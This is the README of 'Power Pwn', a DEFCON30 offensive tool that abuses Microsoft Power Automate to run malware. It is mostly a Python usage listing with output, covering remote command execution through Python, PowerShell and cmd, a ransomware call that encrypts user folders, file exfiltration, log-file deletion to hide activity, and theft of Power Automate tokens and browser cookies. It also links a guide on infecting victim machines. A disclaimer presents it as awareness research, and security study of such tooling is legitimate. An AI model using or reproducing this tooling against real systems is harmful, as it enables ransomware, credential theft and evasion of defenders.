# Power Pwn

Power Pwn is a demo showing how to repurpose Microsoft-trusted executables, service accounts and cloud services to power a malware operation.

<a href="https://powerautomate.microsoft.com/en-us/robotic-process-automation/"><img src="https://docs.microsoft.com/en-us/power-pages/media/overview/power-platform.png" alt="Power Pwn" width="500" height="250" /></a>

----

This tool was released as part of DEFCON30. For more details, see [No-Code Malware: Windows 11 At Your Service](https://github.com/mbrg/defcon30/blob/main/No_Code_Malware/readme.md).

Disclaimer: these materials are presented from an attacker’s perspective with the goal of raising awareness to the risks of underestimating the security impact of No Code/Low Code. No Code/Low Code is awesome.

## Usage

```python
from powerpwn.cli import PowerPwn
POST_URL = ""
pp=PowerPwn(post_url=POST_URL)

### code execution

# python2
pp.exec_py2("print('hello world')").CodeExec
# CodeExecOutputs(ScriptOutput='\ufeffhello world\r\n', ScriptError='')

# python2 bad syntax
pp.exec_py2("bad syntax").CodeExec
# CodeExecOutputs(ScriptOutput='', ScriptError='  File "", line 1\r\n    bad syntax\r\n        ^\r\nSyntaxError: unexpected token \'syntax\'')

# powershell
pp.exec_ps("Write-Host \"hello word\"").CodeExec

# commandline
pp.exec_cmd("echo \"hello word\"").CodeExec
# CodeExecOutputs(ScriptOutput='Microsoft Windows [Version 10.0.22000.795]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Program Files (x86)\\Power Automate Desktop>echo "hello word"\r\n"hello word"\r\n\r\n', ScriptError='')

### ransomware

pp.ransomware(crawl_depth=2, dirs_to_init_crawl=["C:\\Users\\alexg\\Documents\\mystuff", "D:\\shh"], encryption_key="8d1d4245").Ransomware
# Ransomware=RansomwareOutputs(FilesFound=9, FilesAccessed=9, FilesProcessed=9, Errors='')

### exfiltration

pp.exfil(target="C:\\Users\\alexg\\Downloads\\takeit.txt").Exfil
# ExfiltrationOutputs(Success=True, FileContents='asd')
pp.exfil(target="C:\\Users\\alexg\\Downloads\\dontexist.txt").Exfil
# ExfiltrationOutputs(Success=False, FileContents='')

### cleanup

pp.cleanup().Cleanup
# CleanupOutputs(FilesFound=179, LogFilesDeleted=178)

### steal_power_automate_token

pp.steal_power_automate_token().StealPowerAutomateToken
# StealPowerAutomateTokenOutputs(Token='ey...')

### steal_cookie
pp.steal_cookie("https://www.google.com").StealCookie
# StealCookieOutputs(Cookie='1P_JAR=2022-07-16-13; OGPC=19027681-1:')
```

## How To

[How to set up your Power Pwn cloud environment](docs/cloud_setup.md)

[How to infect a victim machine](docs/infect_machine.md)

[How to troubleshoot execution errors](docs/infect_machine.md)
